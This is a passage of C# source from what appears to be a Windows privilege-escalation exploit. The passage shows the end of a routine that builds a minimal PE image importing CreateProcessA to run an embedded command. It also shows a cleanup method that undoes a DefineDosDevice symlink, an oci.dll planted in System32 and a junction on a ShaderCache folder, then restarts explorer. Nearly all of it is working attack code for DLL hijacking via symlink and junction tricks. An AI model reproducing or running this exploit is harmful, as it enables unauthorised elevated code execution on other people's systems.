                // Entry 2: null terminator
                bw.Write(new byte[20]);

                // ============================================================
                // Import Lookup Table (ILT) at RVA 0x10A8 (file offset 0x2A8)
                // One entry + null terminator (8 bytes each for PE32+)
                // ============================================================
                bw.Write((ulong)0);              // Hint/Name RVA (placeholder — fixed up below)
                bw.Write((ulong)0);              // null terminator

                // ============================================================
                // Import Address Table (IAT) at RVA 0x10B8 (file offset 0x2B8)
                // Same structure as ILT before loader binding
                // ============================================================
                bw.Write((ulong)0);              // Hint/Name RVA (placeholder — fixed up below)
                bw.Write((ulong)0);              // null terminator

                // ============================================================
                // Command string at RVA 0x10C8 (file offset 0x2C8)
                // ============================================================
                bw.Write(commandBytes);

                // ============================================================
                // Dynamic-position data: DLL name + Hint/Name entry
                // Positions depend on command string length, so RVAs are fixed up after writing.
                // ============================================================
                long sectionStart = 0x200;

                // "kernel32.dll\0"
                long dllNameFileOffset = ms.Position;
                uint dllNameRva = (uint)(0x1000 + (dllNameFileOffset - sectionStart));
                bw.Write(Encoding.ASCII.GetBytes("kernel32.dll\0"));

                // Hint/Name entry: 2-byte hint + "CreateProcessA\0"
                long hintNameFileOffset = ms.Position;
                uint hintNameRva = (uint)(0x1000 + (hintNameFileOffset - sectionStart));
                bw.Write((ushort)0);             // Hint ordinal (0 = let loader search by name)
                bw.Write(Encoding.ASCII.GetBytes("CreateProcessA\0"));

                // ============================================================
                // Fix up placeholder RVAs
                // ============================================================
                long savedPos = ms.Position;

                // Import Directory: Name RVA (offset 12 within first entry)
                ms.Position = sectionStart + 0x80 + 12;
                bw.Write(dllNameRva);

                // ILT entry at section offset 0xA8
                ms.Position = sectionStart + 0xA8;
                bw.Write((ulong)hintNameRva);

                // IAT entry at section offset 0xB8
                ms.Position = sectionStart + 0xB8;
                bw.Write((ulong)hintNameRva);

                // Return to end
                ms.Position = savedPos;

                // Pad to file alignment boundary
                long totalSectionBytes = ms.Position - sectionStart;
                int padToAlign = (int)(((totalSectionBytes + 0x1FF) / 0x200) * 0x200 - totalSectionBytes);
                if (padToAlign > 0)
                    bw.Write(new byte[padToAlign]);

                bw.Flush();
                return ms.ToArray();
            }
        }

        /// <summary>
        /// Cleanup: delete oci.dll, remove DosDevice symlink, remove junction, restart explorer.
        /// </summary>
        private void Cleanup()
        {
            Console.WriteLine("[*] Cleaning up...");

            // Remove DosDevice symlink
            if (_dosDeviceName != null && _dosDeviceTarget != null)
            {
                try
                {
                    _defineDosDeviceW(
                        DDD_REMOVE_DEFINITION | DDD_RAW_TARGET_PATH | DDD_EXACT_MATCH_ON_REMOVE,
                        _dosDeviceName,
                        _dosDeviceTarget);
                }
                catch { }
            }

            // Delete oci.dll from System32
            if (_ociPath != null)
            {
                try
                {
                    if (File.Exists(_ociPath))
                        File.Delete(_ociPath);
                }
                catch { }
            }

            // Remove junction (delete the directory)
            if (_shaderCachePath != null)
            {
                try
                {
                    if (Directory.Exists(_shaderCachePath))
                    {
                        // Junction is a reparse point; Directory.Delete handles it
                        Directory.Delete(_shaderCachePath, false);
                    }
                    // Recreate empty ShaderCache dir to restore normal state
                    Directory.CreateDirectory(_shaderCachePath);
                }
                catch { }
            }

            // Restart explorer if it was killed
            try
            {
                if (Process.GetProcessesByName("explorer").Length == 0)
                {
                    Process.Start("explorer.exe");
                }
            }
            catch { }

            Console.WriteLine("[+] Cleanup complete");
        }
    }
}
